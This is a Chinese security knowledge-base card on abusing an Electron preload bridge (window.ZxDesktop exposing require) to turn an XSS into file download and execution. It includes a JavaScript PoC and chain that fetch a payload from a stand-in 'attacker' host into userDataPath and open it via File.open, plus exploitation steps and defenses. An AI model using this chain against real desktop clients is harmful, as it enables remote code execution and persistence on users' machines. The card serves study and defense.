---
id: web-generic-xss-electron-preload-exposed-require-file-system-abuse
title: Electron preload 把 require 暴露成 window.ZxDesktop：XSS 用 File.save 任意下载落盘、System.userDataPath 拼路径后 File.open 打开执行
type: scenario
domain: web
path: web/generic/xss
technique: electron-preload-exposed-require-file-system-abuse
tags:
- web
- xss
- electron
- preload
- contextbridge
- file-write
- file-open
- rce
- desktop
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V564
  verified_at: '2026-11-12T08:06:16+08:00'
  notes: 已对照原文与图02/03/04核对：原文称preload.js在页面创建前执行并创建window对象ZxDesktop，可用其require引入File包执行命令；图02为ZxDesktop.require(File).open(calc.exe)弹出计算器、图03为File模块saveAs(file)用Path.join(lastPath||file.path||me.default.path, file.name||me.default.name)拼接落点、图04为System模块_exports中dbPath/userDataPath=remote.app.getPath(userData)与ipcRenderer调用，均与卡一致；卡内PoC（a.require(File); b.save({url,name,path,chunkSize,size,fileData}); b.open(a.require(System).userDataPath + /test.txt)）与原文代码逐字一致。dedup仅自匹配；electron-ipc-curl-file-read、desktop-client-showsavefilepicker 等候选为related不同preload能力/sink，非同链。原文未给版本区间与CVE，未set-versions；未复跑。
url: /docs/web/generic/xss/web-generic-xss-electron-preload-exposed-require-file-system-abuse/
draft: false
kb_aliases:
- ZxDesktop 滥用
- preload 暴露 require
- Electron File.save 任意下载
- System.userDataPath 拼路径
- File.open 执行文件
- Electron 通信客户端 XSS
---

## 一句话结论

Electron 通信类应用常在 preload 中把内部模块封装成 `window.ZxDesktop`，若其中直接暴露 `require`，渲染进程的 XSS 就能 `ZxDesktop.require("File")` 获得文件模块、`ZxDesktop.require("System")` 拿到 `userDataPath`/`dbPath`，再用 `File.save({url,name,path,...})` 把远程文件下载到已知数据目录、`File.open(<路径>)` 打开（可执行文件则被执行），从而从 XSS 走到任意文件写入与命令执行。

## 原理

- **preload 暴露的桥过宽**：preload 运行在拥有 Node 能力的上下文，本应只通过 `contextBridge` 暴露最小 API；把 `require` 本身或包装后的 `ZxDesktop.require(moduleName)` 暴露给网页，等于把任意 Node 模块加载权交给渲染进程，XSS 后可直接加载 `File`/`System`/`child_process` 等。
- **File 模块的两个危险方法**：`File.save({url, name, path, chunkSize, size, fileData})` 负责把远程 URL 下载到本地（`path`/`name` 决定落点），`File.open(path)` 用系统默认方式打开文件——对 `.exe`/`.bat`/`.app` 而言就是执行。
- **System 模块提供路径**：`System.userDataPath`/`dbPath` 来自 `remote.app.getPath('userData')`，是应用数据目录的绝对路径；攻击者不需要猜路径，读属性即可拼出可写落点。
- **组合链**：XSS → `require("System")` 读 `userDataPath` → `require("File").save({url:'http://attacker/payload.exe', name:'payload.exe', path:userDataPath})` 下载 → `File.open(userDataPath + '/payload.exe')` 执行，或在 `File.save` 的 `path`/`name` 上做路径拼接覆盖配置文件实现持久化。
- **为什么成立**：这些能力原本用于"下载更新包/打开下载目录"等业务，暴露面越大，XSS 的危害越大；Electron 的 preload 桥若不做方法白名单与参数校验，网页侧就能把文件下载/打开原语组合成 RCE。

## 触发条件

- Electron 应用 preload 通过 `window.ZxDesktop`（或类似对象）暴露 `require`/文件模块/系统路径。
- 渲染进程存在 XSS（聊天消息、公告、文件预览等）。
- 应用以当前用户权限运行，数据目录可写，允许 `File.open` 打开可执行文件。
- 目标可访问攻击者的 HTTP 服务（下载载荷）。

## 利用步骤

1. 在控制台/注入脚本中确认 `window.ZxDesktop` 存在，枚举可 `require` 的模块（`File`、`System` 等）。
2. 读 `ZxDesktop.require("System").userDataPath` 得到数据目录。
3. 调 `File.save` 把远程可执行文件/脚本下载到该目录（或路径拼接覆盖启动配置）。
4. 调 `File.open(路径)` 打开/执行；或等待应用下次启动加载被覆盖的配置。
5. 验证命令执行/持久化。

## PoC

```javascript
var a = ZxDesktop;
var b = a.require("File");
b.save({
  "url": "http://attacker/test.txt",
  "name": "test.txt",
  "path": "",
  "chunkSize": "",
  "size": "",
  "fileData": ""
});
b.open(a.require("System").userDataPath + "/test.txt");
```

```javascript
// 控制台可直接执行（原文截图效果）
ZxDesktop.require("File").open("calc.exe")
```

## 变体与关联

- 关联：[[web-generic-xss-electron-ipc-curl-file-read-bot-cookie]]（preload 暴露 `curl` IPC 读文件）、[[web-generic-xss-electron-nodeintegration-renderer-rce]]（nodeIntegration 直接 require）、[[web-generic-xss-electron-contextisolation-webpack-require-escape]]（窃取 webpack require）。
- 变体：暴露 `shell.openExternal`/`shell.openPath` 可直接打开 URL/文件；暴露 `fs` 可任意读写；`File.save` 的 `path`/`name` 未校验时可路径穿越覆盖任意可写文件，结合应用自启动配置实现持久化。
- 边界：preload 只暴露白名单方法且参数校验（URL 域名、落盘目录、文件类型）、`contextIsolation: true` + sandbox、File.open 对可执行类型二次确认时，链路受限。

## 检测与防御

- **检测**：渲染进程 XSS 后出现 `ZxDesktop.require`/`File.save`/`File.open` 调用；应用数据目录出现未知可执行文件或配置文件被改写；应用外连可疑下载地址。
- **防御**：preload 不暴露 `require` 与原始模块，改用 `contextBridge` 暴露窄接口（固定下载源、固定目录、类型白名单）；`contextIsolation: true`、`sandbox: true`、`nodeIntegration: false`；对下载文件做签名/哈希校验，打开可执行文件前确认；渲染内容净化与 CSP。
